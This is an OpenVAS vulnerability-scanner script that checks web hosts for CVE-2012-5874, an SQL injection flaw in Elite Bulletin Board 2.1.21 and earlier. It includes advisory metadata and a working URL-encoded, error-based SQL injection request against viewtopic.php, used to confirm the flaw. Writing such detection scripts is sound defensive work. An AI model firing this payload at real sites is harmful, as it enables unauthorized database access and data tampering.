##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_elite_bulletin_board_mult_sql_inj_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Elite Bulletin Board Multiple SQL Injection Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to compromise the
  application, access or modify data or exploit vulnerabilities in the
  underlying database.
  Impact Level: Application";
tag_affected = "Elite Bulletin Board version 2.1.21 and prior";
tag_insight = "Input appended to the URL after multiple scripts is not properly sanitised
  within the 'update_whosonline_reg()' and 'update_whosonline_guest()'
  functions (includes/user_function.php) before being used in a SQL query.";
tag_solution = "Upgrade to Elite Bulletin Board 2.1.22 or later,
  For updates refer to http://elite-board.us/";
tag_summary = "This host is installed with Elite Bulletin Board and is prone to
  multiple SQL injection vulnerabilities.";

if(description)
{
  script_id(803132);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-5874");
  script_bugtraq_id(57000);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-12-27 15:24:00 +0530 (Thu, 27 Dec 2012)");
  script_name("Elite Bulletin Board Multiple SQL Injection Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/88531");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/51622/");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/80760");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2012/Dec/113");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/23575/");
  script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23133");

  script_description(desc);
  script_summary("Check if  Elite Bulletin Board is vulnerable to SQL injection");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
dir = "";
url = "";
port = 0;

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over possible paths
foreach dir(make_list("", "/ebbv", "/ebbv2", "", cgi_dirs()))
{

  url = dir + "/index.php";

  ## Confirm the application before trying exploit
  if(http_vuln_check(port: port, url: url, check_header: TRUE,
                     pattern: ">Elite Bulletin Board<"))
  {
    ## Construct attack request
    url = dir +  "/viewtopic.php/%27,%28%28select*from%28select%20" +
          "name_const%28version%28%29,1%29,name_co%20nst%28version%28%29" +
          ",1%29%29a%29%29%29%20--%20/?bid=1&tid=1";

    ## Try exploit and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, pattern:'/includes/db.php',
     extra_check: make_list("MySQL server", "SQL Command", "Grouplist")))
    {
      security_hole(port);
      exit(0);
    }
  }
}
